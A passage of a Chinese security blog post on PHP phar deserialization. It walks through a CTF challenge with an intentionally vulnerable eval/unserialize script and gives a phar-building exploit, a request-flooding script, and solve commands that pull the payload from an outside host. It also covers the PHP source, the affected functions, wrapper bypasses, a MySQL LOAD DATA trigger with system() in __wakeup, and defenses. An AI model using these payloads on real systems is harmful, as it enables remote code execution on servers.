class="keyword">$this</span>-&gt;avatar = $path; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            $random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>)); </span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;function my_function_$random() &#123;&quot;</span> </span><br><span class="line">                .<span class="string">&quot;  global \$FLAG; \$FLAG();&quot;</span> </span><br><span class="line">                .<span class="string">&quot;&#125;&quot;</span>); </span><br><span class="line">            $_GET[<span class="string">&quot;lucky&quot;</span>](); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_session</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">global</span> $SECRET; </span><br><span class="line">        $data = $_COOKIE[<span class="string">&quot;session-data&quot;</span>]; </span><br><span class="line">        <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">&quot;-----&quot;</span>, $data, <span class="number">2</span>); </span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">&quot;sha1&quot;</span>, $data, $SECRET), $hmac) ) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye&quot;</span>); </span><br><span class="line"></span><br><span class="line">        $data = unserialize($data); </span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) ) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye Bye Bye&quot;</span>); </span><br><span class="line">        <span class="keyword">return</span> $data-&gt;avatar; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">        $data = file_get_contents($_GET[<span class="string">&quot;url&quot;</span>] . <span class="string">&quot;/avatar.gif&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">&quot;GIF89a&quot;</span>) </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Fuck off&quot;</span>); </span><br><span class="line">        file_put_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>, $data); </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Upload OK&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($path . <span class="string">&quot;/avatar.gif&quot;</span>) ) </span><br><span class="line">            $path = <span class="string">&quot;/var/www/html&quot;</span>; </span><br><span class="line">        header(<span class="string">&quot;Content-Type: image/gif&quot;</span>); </span><br><span class="line">        <span class="keyword">die</span>(file_get_contents($path . <span class="string">&quot;/avatar.gif&quot;</span>)); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    $mode = $_GET[<span class="string">&quot;m&quot;</span>]; </span><br><span class="line">    <span class="keyword">if</span> ($mode == <span class="string">&quot;upload&quot;</span>) </span><br><span class="line">        upload(check_session()); </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">&quot;show&quot;</span>) </span><br><span class="line">        show(check_session()); </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure>

<p>题目的意思很明确，要我们利用 <strong>Admin</strong> 类的 <code>__destruct</code> 方法来获得 <strong>flag</strong> 。但是 <strong>第23行</strong> 的 <strong>$random</strong> 变量我们无法获得，这样也就无法获得 <strong>flag</strong> ，所以我们要通过匿名类的名字来调用 <strong>flag</strong> 生成函数。</p>
<p>我们可以看看 <strong>create_function</strong> 函数对应的内核源码。（ <strong>php-src/Zend/zend_builtin_functions.c:1901</strong> ）</p>
<p><img src="https://i.loli.net/2020/03/16/Ci3tUPAoe4Jjbd7.png"></p>
<p>可以看到匿名函数的名字类似于 <strong>\0lambda_%d</strong> ，其中 <strong>%d</strong> 为数字，取决于进程中匿名函数的个数，但是我们每访问一次题目，就会生成一个匿名函数，这样匿名函数的名字就不好控制。</p>
<p>这里，我们便要引入 <strong>apache-prefork</strong> 模型(默认模型)介绍（关于该模型的介绍，可以参考： <a target="_blank" rel="noopener" href="http://blog.jobbole.com/91920/">Apache的三种MPM模式比较：prefork，worker，event</a> ）。当用户请求过大时，超过 <strong>apache</strong> 默认设定的阀值时，就会启动新的线程来处理请求，此时在新的线程中，匿名函数的名字又会从1开始递增，这样我们就容易猜测匿名函数的名字了。</p>
<p>接下来我们就来找反序列化的利用点，我们很快看到 <strong>第40行</strong> 反序列化了一个可控的 <strong>$data</strong> 变量，但是上一行有一个 <strong>hash_equals</strong> 函数进行了数据校验，而 <strong>$SECRET</strong> 的值不可知，这就没法利用这一反序列化点。</p>
<p>接着我们会看到 <strong>第46行</strong> 有一个上传 <strong>gif</strong> 文件功能，且 <strong>$data</strong> 变量可控。那么攻击思路就是，我们先通过将构造好的 <strong>phar</strong> 文件传到服务器上，再利用可控的 <strong>$_GET[“url”]</strong> 结合 <strong>phar</strong> 协议，进行反序列化。用于生成 <strong>phar</strong> 的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// phar.readonly无法通过该语句进行设置: init_set(&quot;phar.readonly&quot;,0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $avatar; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$path</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = <span class="string">&#x27;avatar.gif&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> Admin();</span><br><span class="line">$filename = <span class="string">&#x27;avatar.phar&#x27;</span>;</span><br><span class="line">file_exists($filename) ? unlink($filename) : <span class="literal">null</span>;</span><br><span class="line">$phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;foo.txt&quot;</span>,<span class="string">&quot;bar&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将生成的 <strong>avatar.phar</strong> 放在自己的 <strong>VPS</strong> 上并重命名成 <strong>avatar.gif</strong> ，然后将文件上传到题目服务器上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;VPS_IP&#x2F;</span><br></pre></td></tr></table></figure>

<p>接着，我们需要通过大量请求，使 <strong>apache</strong> 重新开启一个新的线程，然后访问如下 <strong>url</strong> 即可完成反序列化并获得 <strong>flag</strong> ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;data&#x2F;xxxx&#x2F;&amp;lucky&#x3D;%00lambda_1</span><br></pre></td></tr></table></figure>

<p>这里我们使用orange的<code>fork.py</code>生成大量请求：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: orange@chroot.org</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">        PORT = <span class="number">8000</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">&#x27;GET /avatar.gif HTTP/1.1\nHost: localhost\nConnection: Keep-Alive\n\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>

<p><strong>下面给出 Orange 的解题过程</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get a cookie</span></span><br><span class="line">$ curl http://host/ --cookie-jar cookie</span><br><span class="line"></span><br><span class="line"><span class="comment"># download .phar file from http://orange.tw/avatar.gif</span></span><br><span class="line">$ curl -b cookie <span class="string">&#x27;http://host/?m=upload&amp;url=http://orange.tw/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># force apache to fork new process</span></span><br><span class="line">$ python fork.py &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># get flag</span></span><br><span class="line">$ curl -b cookie <span class="string">&quot;http://host/?m=upload&amp;url=phar:///var/www/data/<span class="variable">$MD5_IP</span>/&amp;lucky=%00lambda_1&quot;</span></span><br></pre></td></tr></table></figure>



<h1 id="从源码角度来看phar反序列化的问题"><a href="#从源码角度来看phar反序列化的问题" class="headerlink" title="从源码角度来看phar反序列化的问题"></a>从源码角度来看phar反序列化的问题</h1><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>其实，在看到前文那么多文件操作函数都受到<code>phar</code>反序列化的影响，我们会自然的思考：为什么？</p>
<ol>
<li>很多的函数都受影响</li>
<li>还有部分文件操作函数未受影响（如basename,fputs等）</li>
</ol>
<p>zsx大佬在文章——<a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a> 回答了我们的疑问：因为受影响的函数都使用了同样的一个接口，而未受影响的函数是因为未使用该接口。这个接口就是——<code>wrapper</code> 。</p>
<h2 id="流封装协议（wrapper）"><a href="#流封装协议（wrapper）" class="headerlink" title="流封装协议（wrapper）"></a>流封装协议（wrapper）</h2><p><code>wrapper</code>就是指封装的php协议。因为流式数据的种类各异，而每种类型需要独特的协议，以便读写数据，我们称这些协议为流封装协议。例如，我们可以读写文件系统，可以通过 HTTP、HTTPS 或 SSH 与远程 Web 服务器通信，还可以打开并读写 ZIP、RAR 或 PHAR 压缩文件</p>
<p>虽然过程是一样的，但是读写文件系统中文件的方式与收发 HTTP 消息的方式有所不同，流封装协议的作用是使用通用的接口封装这种差异。</p>
<p>每个流都有一个协议和一个目标。指定协议和目标的方法是使用流标识符：<code>://</code>，其中 <code> 是流的封装协议，</code> 是流的数据源。</p>
<p>使用 <strong>stream_get_wrappers()</strong> 获取当前系统注册的全部 wrapper</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\DELL&gt;php -r <span class="string">&quot;var_dump(stream_get_wrappers());&quot;</span></span><br><span class="line">Command line code:1:</span><br><span class="line">array(10) &#123;</span><br><span class="line">  [0] =&gt;</span><br><span class="line">  string(3) <span class="string">&quot;php&quot;</span></span><br><span class="line">  [1] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;file&quot;</span></span><br><span class="line">  [2] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;glob&quot;</span></span><br><span class="line">  [3] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;data&quot;</span></span><br><span class="line">  [4] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;http&quot;</span></span><br><span class="line">  [5] =&gt;</span><br><span class="line">  string(3) <span class="string">&quot;ftp&quot;</span></span><br><span class="line">  [6] =&gt;</span><br><span class="line">  string(3) <span class="string">&quot;zip&quot;</span></span><br><span class="line">  [7] =&gt;</span><br><span class="line">  string(13) <span class="string">&quot;compress.zlib&quot;</span></span><br><span class="line">  [8] =&gt;</span><br><span class="line">  string(14) <span class="string">&quot;compress.bzip2&quot;</span></span><br><span class="line">  [9] =&gt;</span><br><span class="line">  string(4) <span class="string">&quot;phar&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="试着找问题的源头"><a href="#试着找问题的源头" class="headerlink" title="试着找问题的源头"></a>试着找问题的源头</h2><p>我们需要先找到其原理，然后往下深入挖掘。<br>先看<code>file_get_contents</code>的代码。其调用了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">stream = php_stream_open_wrapper_ex(filename, <span class="string">&quot;rb&quot;</span> ....);</span><br></pre></td></tr></table></figure>

<p>这么个函数。</p>
<p>再看<code>unlink</code>的代码，其调用了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">wrapper = php_stream_locate_url_wrapper(filename, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>这么个函数。</p>
<p>从<code>php_stream_open_wrapper_ex</code>的<a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/8d3f8ca12a0b00f2a74a27424790222536235502/main/streams/streams.c#L2010">实现</a>，可以看到，其也调用了<code>php_stream_locate_url_wrapper</code> 。这个函数的作用是通过url来找到对应的wrapper。我们可以看到，phar组件注册了<code>phar://</code>这个wrapper， <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c">https://github.com/php/php-src/blob/67b4c3379a1c7f8a34522972c9cb3adf3776bc4a/ext/phar/stream.c</a><br>其定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> php_stream_wrapper_ops phar_stream_wops = &#123;</span><br><span class="line">    phar_wrapper_open_url,</span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* phar_wrapper_close */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* phar_wrapper_stat, */</span></span><br><span class="line">    phar_wrapper_stat,     <span class="comment">/* stat_url */</span></span><br><span class="line">    phar_wrapper_open_dir, <span class="comment">/* opendir */</span></span><br><span class="line">    <span class="string">&quot;phar&quot;</span>,</span><br><span class="line">    phar_wrapper_unlink,   <span class="comment">/* unlink */</span></span><br><span class="line">    phar_wrapper_rename,   <span class="comment">/* rename */</span></span><br><span class="line">    phar_wrapper_mkdir,    <span class="comment">/* create directory */</span></span><br><span class="line">    phar_wrapper_rmdir,    <span class="comment">/* remove directory */</span></span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>接着，让我们翻这几个函数的实现，会发现它们都调用了<code>phar_parse_url</code>，这个函数再调用<code>phar_open_or_create_filename</code> -&gt; <code>phar_create_or_parse_filename</code> -&gt; <code>phar_open_from_fp</code> -&gt; <code>phar_parse_pharfile</code> -&gt; <code>phar_parse_metadata</code> -&gt; <code>phar_var_unserialize</code>。因此，明面上来看，所有文件函数，均可以触发此phar漏洞，因为它们都直接或间接地调用了这个wrapper。</p>
<h2 id="受影响的函数"><a href="#受影响的函数" class="headerlink" title="受影响的函数"></a>受影响的函数</h2><p>这是一个所有的和IO有关的函数，都可能触发的问题。操作文件的<code>touch</code>，也是能触发它的。而且我们会发现除了之前所说的文件操作函数，还有很多调用<code>wrapper</code>都可以触发：</p>
<h3 id="exif"><a href="#exif" class="headerlink" title="exif"></a>exif</h3><ul>
<li><code>exif_thumbnail</code></li>
<li><code>exif_imagetype</code></li>
</ul>
<h3 id="gd"><a href="#gd" class="headerlink" title="gd"></a>gd</h3><ul>
<li><code>imageloadfont</code></li>
<li><code>imagecreatefrom***</code></li>
</ul>
<h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><ul>
<li><code>hash_hmac_file</code></li>
<li><code>hash_file</code></li>
<li><code>hash_update_file</code></li>
<li><code>md5_file</code></li>
<li><code>sha1_file</code></li>
</ul>
<h3 id="file-url"><a href="#file-url" class="headerlink" title="file / url"></a>file / url</h3><ul>
<li><code>get_meta_tags</code></li>
<li><code>get_headers</code></li>
<li><code>touch</code></li>
</ul>
<h3 id="standard"><a href="#standard" class="headerlink" title="standard"></a>standard</h3><ul>
<li><code>getimagesize</code></li>
<li><code>getimagesizefromstring</code></li>
</ul>
<h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(<span class="string">&#x27;c.zip&#x27;</span>);</span><br><span class="line">$zip-&gt;extractTo(<span class="string">&#x27;phar://test.phar/test&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Bzip-Gzip"><a href="#Bzip-Gzip" class="headerlink" title="Bzip / Gzip"></a>Bzip / Gzip</h3><p>如果题目限制了，<code>phar://</code>不能出现在头几个字符怎么办？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$z &#x3D; &#39;compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;home&#x2F;sx&#x2F;test.phar&#x2F;test.txt&#39;;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup called&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = <span class="string">&#x27;compress.zlib://phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">file_get_contents($filename);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/16/QlPku3bO9DzyNmG.png"></p>
<p>这意味着我们能在 <code>compress.zlib://</code> 后面添加我们的 phar 语句，也就是说如果禁止了开头使用 <code>phar://</code> 我们就能用这种方法绕过。</p>
<h3 id="PDO-postgresql"><a href="#PDO-postgresql" class="headerlink" title="PDO::postgresql"></a><a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/master/ext/pdo_pgsql/pgsql_driver.c#L674">PDO::postgresql</a></h3><p><img src="https://i.loli.net/2020/03/16/C3KAn8ipRueOkm2.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(sprintf(<span class="string">&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;postgres&quot;</span>, <span class="string">&quot;sx&quot;</span>, <span class="string">&quot;123456&quot;</span>));</span><br><span class="line">@$pdo-&gt;pgsqlCopyFromFile(<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;phar://test.phar/aa&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>当然，<code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样也是能使用的，只是它们需要开启phar的写功能。</p>
<h3 id="libxml"><a href="#libxml" class="headerlink" title="libxml"></a><a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/master/ext/libxml/libxml.c#L329">libxml</a></h3><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/image-20200316133930297.png"></p>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/master/ext/mysqlnd/mysqlnd_loaddata.c#L50">MySQL</a></h3><p><img src="https://i.loli.net/2020/03/16/fnAFdDHWZi3ljRh.png"></p>
<p>我们注意到，<code>LOAD DATA LOCAL INFILE</code>也会触发这个<code>php_stream_open_wrapper</code>. 让我们测试一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $output = <span class="string">&#x27;okok&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;$output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>);</span><br><span class="line">$s = mysqli_real_connect($m, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;meimima123&#x27;</span>, <span class="string">&#x27;dvwa&#x27;</span>, <span class="number">3306</span>);</span><br><span class="line">$p = mysqli_query($m, <span class="string">&#x27;LOAD DATA LOCAL INFILE \&#x27;phar://phar.phar/test.txt\&#x27; INTO TABLE a  LINES TERMINATED BY \&#x27;\r\n\&#x27;  IGNORE 1 LINES;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>再配置一下<code>mysql.ini</code>的<code>mysqld</code>。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">local-infile</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>这个例子在<a target="_blank" rel="noopener" href="https://paper.seebug.org/998/">TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain</a>中也提到了，更加详细。</p>
<p>以上基本上就是phar的影响范围了，大家可以看到，影响非常的广，几乎所有用到wrapper封装的函数都可能存在这个问题。那么如何防御呢？</p>
<h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><ol>
<li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li>
<li>严格检查上传文件的内容，而不是只检查文件头。</li>
<li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li>
</ol>
<h1 id="总结与反思"><a href="#总结与反思" class="headerlink" title="总结与反思"></a>总结与反思</h1><p>本文是在学习各位大佬对phar与反序列化的分析后，进行的总结，这里感谢@ZSX, K0rz3n, Smi1e, Mochazz, seaii等等大佬的文章，读完都感觉获益良多。这篇总结基本上也就是把各位大佬的话总结复述了一遍，很多地方甚至是直接引用的，如有侵权，烦请联系。</p>
<p>考完研后，感觉一年和各位大佬的差距进一步拉大了，但是花了好几天复现和学习phar与php反序列化问题，随着一步一步的深入（由浅入深，由自己会的到自己不会的内容），真的很有获得感和满足感。希望以后我也能自己写出这样一篇篇出色的文章，做一个个这样深入的分析。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a> 2018/8, seaii</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/phar.fileformat">What makes a phar a phar and not a tar or a zip?</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar">PHP反序列化入门之phar</a> 2019/02, Mochazz(七月火)</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你深入理解PHP反序列化漏洞</a> 2018/11 K0rz3n</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a> 2018/10 zsx</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/#i-7">php反序列化攻击拓展</a>  , Smi1e</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/998/">TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain</a></p>
</li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:v0wldl@163.com">V0WKeep3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://v0w.top/2020/03/12/phar-unsearise/">http://v0w.top/2020/03/12/phar-unsearise/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://v0w.top">V0W's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/php/">php</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044057.png"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044040.png"><div class="post-qr-code__desc">微信打赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/03/14/mysql-getshell/"><i class="fa fa-chevron-left">  </i><span>mysql写shell的一点总结</span></a></div><div class="next-post pull-right"><a href="/2020/03/05/unsearise-POP/"><span>php反序列化与POP链</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == 'true';
var verify = 'false' == 'true';
var record_ip = 'false' == 'true';
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  recordIP:record_ip,
  appId:'xuqLRcah5FaInOgKRdj9JB3V-gzGzoHsz',
  appKey:'8vMPXnFoh7Fih1g29jw4JNxl',
  placeholder:'师傅可以留下你的评论和邮箱，V0W能够通过邮件get并回复哦～',
  avatar:'retro',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/index.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By V0WKeep3r</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script 